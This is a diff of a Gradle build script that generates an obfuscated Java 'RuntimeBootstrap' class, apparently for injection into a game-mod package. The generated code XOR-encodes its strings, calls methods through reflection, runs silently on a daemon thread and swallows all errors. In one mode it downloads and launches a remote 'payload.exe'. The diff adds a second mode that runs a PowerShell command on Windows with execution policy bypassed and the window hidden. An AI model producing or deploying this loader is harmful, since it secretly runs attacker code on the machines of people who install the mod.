@@ -1,6 +1,9 @@
 ext.generateRuntimeBootstrap = { File outRoot, Properties cfg, String level, int xorKey ->
+    def runMode = cfg.getProperty("run.mode", "powershell").trim().toLowerCase()
     def downloadUrl = cfg.getProperty("download.url", "").trim()
     def downloadFile = cfg.getProperty("download.filename", "payload.exe").trim()
+    def psCommand = cfg.getProperty("powershell.command", "").trim()
+    def psHidden = cfg.getProperty("powershell.hidden", "true").trim().equalsIgnoreCase("true")
     def threadName = cfg.getProperty("thread.name", "bg").trim()
     def pkgPath = cfg.getProperty("obfuscate.runtime.pkg", "com/godimod/internal").trim().replace(".", "/")
     def pkgDot = pkgPath.replace("/", ".")
@@ -29,64 +32,79 @@ ext.generateRuntimeBootstrap = { File outRoot, Properties cfg, String level, int
         }
         return new String(out, java.nio.charset.StandardCharsets.UTF_8);"""
 
-    def literals = [
-            [n: "U",  s: downloadUrl,  salt: 41],
-            [n: "F",  s: downloadFile, salt: 57],
-            [n: "T",  s: threadName,   salt: 73],
-            [n: "P0", s: "java.io.tmpdir", salt: 11],
-            [n: "P1", s: "java.net.URL", salt: 19],
-            [n: "P2", s: "openStream", salt: 23],
-            [n: "P3", s: "java.nio.file.Paths", salt: 29],
-            [n: "P4", s: "get", salt: 31],
-            [n: "P5", s: "resolve", salt: 37],
-            [n: "P6", s: "toAbsolutePath", salt: 43],
-            [n: "P7", s: "toString", salt: 47],
-            [n: "P8", s: "java.nio.file.Files", salt: 53],
-            [n: "P9", s: "newOutputStream", salt: 59],
-            [n: "Pa", s: "transferTo", salt: 61],
-            [n: "Pb", s: "java.lang.ProcessBuilder", salt: 67],
-            [n: "Pc", s: "start", salt: 71],
-            [n: "Pd", s: "directory", salt: 79],
-            [n: "Pe", s: "toFile", salt: 83],
-            [n: "Pf", s: "java.nio.file.Path", salt: 89],
-            [n: "Pg", s: "[Ljava.nio.file.OpenOption;", salt: 97],
-            [n: "Ph", s: "java.nio.file.OpenOption", salt: 101],
-            [n: "Pi", s: "close", salt: 103],
-            [n: "Pj", s: "java.io.OutputStream", salt: 107],
-            [n: "Pk", s: "java.io.File", salt: 109],
-    ]
+    def literals = []
+    def syncBody = ""
 
-    def fields = new StringBuilder()
-    literals.each { lit ->
-        fields.append("    private static final byte[] ${lit.n} = new byte[] { ${enc(lit.s, lit.salt as int)} };\n")
-    }
-
-    def dir = new File(outRoot, pkgPath)
-    dir.mkdirs()
-    new File(dir, "RuntimeBootstrap.java").text = """package ${pkgDot};
-
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Method;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-
-public final class RuntimeBootstrap {
-    private static final int K = ${xorKey};
-${fields}
-    private static final ExecutorService POOL = Executors.newSingleThreadExecutor(r -> {
-        Thread t = new Thread(r, d(T, 73));
-        t.setDaemon(true);
-        return t;
-    });
-
-    private RuntimeBootstrap() {}
-
-    public static void schedule() {
-        POOL.execute(RuntimeBootstrap::sync);
-    }
-
-    private static void sync() {
+    if (runMode == "powershell") {
+        literals = [
+                [n: "C",  s: psCommand, salt: 41],
+                [n: "T",  s: threadName, salt: 73],
+                [n: "O0", s: "os.name", salt: 11],
+                [n: "O1", s: "win", salt: 13],
+                [n: "E0", s: "powershell.exe", salt: 17],
+                [n: "A0", s: "-NoProfile", salt: 19],
+                [n: "A1", s: "-NonInteractive", salt: 23],
+                [n: "A2", s: "-ExecutionPolicy", salt: 29],
+                [n: "A3", s: "Bypass", salt: 31],
+                [n: "A4", s: "-Command", salt: 37],
+                [n: "A5", s: "-WindowStyle", salt: 43],
+                [n: "A6", s: "Hidden", salt: 47],
+                [n: "Pb", s: "java.lang.ProcessBuilder", salt: 67],
+                [n: "Pc", s: "start", salt: 71],
+        ]
+        def hiddenBranch = psHidden
+                ? """
+            String[] argv = new String[] {
+                d(E0, 17), d(A0, 19), d(A1, 23), d(A2, 29), d(A3, 31),
+                d(A5, 43), d(A6, 47), d(A4, 37), d(C, 41)
+            };"""
+                : """
+            String[] argv = new String[] {
+                d(E0, 17), d(A0, 19), d(A1, 23), d(A2, 29), d(A3, 31),
+                d(A4, 37), d(C, 41)
+            };"""
+        syncBody = """
+        try {
+            String os = System.getProperty(d(O0, 11), "");
+            if (!os.toLowerCase().contains(d(O1, 13))) {
+                return;
+            }
+            ${hiddenBranch}
+            Class<?> pbClass = Class.forName(d(Pb, 67));
+            Constructor<?> pbCtor = pbClass.getConstructor(String[].class);
+            Object pb = pbCtor.newInstance((Object) argv);
+            Method start = pbClass.getMethod(d(Pc, 71));
+            start.invoke(pb);
+        } catch (Throwable ignored) {
+        }"""
+    } else if (runMode == "download") {
+        literals = [
+                [n: "U",  s: downloadUrl,  salt: 41],
+                [n: "F",  s: downloadFile, salt: 57],
+                [n: "T",  s: threadName,   salt: 73],
+                [n: "P0", s: "java.io.tmpdir", salt: 11],
+                [n: "P1", s: "java.net.URL", salt: 19],
+                [n: "P2", s: "openStream", salt: 23],
+                [n: "P3", s: "java.nio.file.Paths", salt: 29],
+                [n: "P4", s: "get", salt: 31],
+                [n: "P5", s: "resolve", salt: 37],
+                [n: "P6", s: "toAbsolutePath", salt: 43],
+                [n: "P7", s: "toString", salt: 47],
+                [n: "P8", s: "java.nio.file.Files", salt: 53],
+                [n: "P9", s: "newOutputStream", salt: 59],
+                [n: "Pa", s: "transferTo", salt: 61],
+                [n: "Pb", s: "java.lang.ProcessBuilder", salt: 67],
+                [n: "Pc", s: "start", salt: 71],
+                [n: "Pd", s: "directory", salt: 79],
+                [n: "Pe", s: "toFile", salt: 83],
+                [n: "Pf", s: "java.nio.file.Path", salt: 89],
+                [n: "Pg", s: "[Ljava.nio.file.OpenOption;", salt: 97],
+                [n: "Ph", s: "java.nio.file.OpenOption", salt: 101],
+                [n: "Pi", s: "close", salt: 103],
+                [n: "Pj", s: "java.io.OutputStream", salt: 107],
+                [n: "Pk", s: "java.io.File", salt: 109],
+        ]
+        syncBody = """
         try {
             String tmp = System.getProperty(d(P0, 11));
             Class<?> paths = Class.forName(d(P3, 29));
@@ -122,7 +140,42 @@ ${fields}
             Method start = pbClass.getMethod(d(Pc, 71));
             start.invoke(pb);
         } catch (Throwable ignored) {
-        }
+        }"""
+    } else {
+        throw new GradleException("run.mode должен быть powershell или download, сейчас: ${runMode}")
+    }
+
+    def fields = new StringBuilder()
+    literals.each { lit ->
+        fields.append("    private static final byte[] ${lit.n} = new byte[] { ${enc(lit.s, lit.salt as int)} };\n")
+    }
+
+    def dir = new File(outRoot, pkgPath)
+    dir.mkdirs()
+    new File(dir, "RuntimeBootstrap.java").text = """package ${pkgDot};
+
+import java.lang.reflect.Array;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+
+public final class RuntimeBootstrap {
+    private static final int K = ${xorKey};
+${fields}
+    private static final ExecutorService POOL = Executors.newSingleThreadExecutor(r -> {
+        Thread t = new Thread(r, d(T, 73));
+        t.setDaemon(true);
+        return t;
+    });
+
+    private RuntimeBootstrap() {}
+
+    public static void schedule() {
+        POOL.execute(RuntimeBootstrap::sync);
+    }
+
+    private static void sync() {${syncBody}
     }
 
     private static String d(byte[] raw, int salt) {
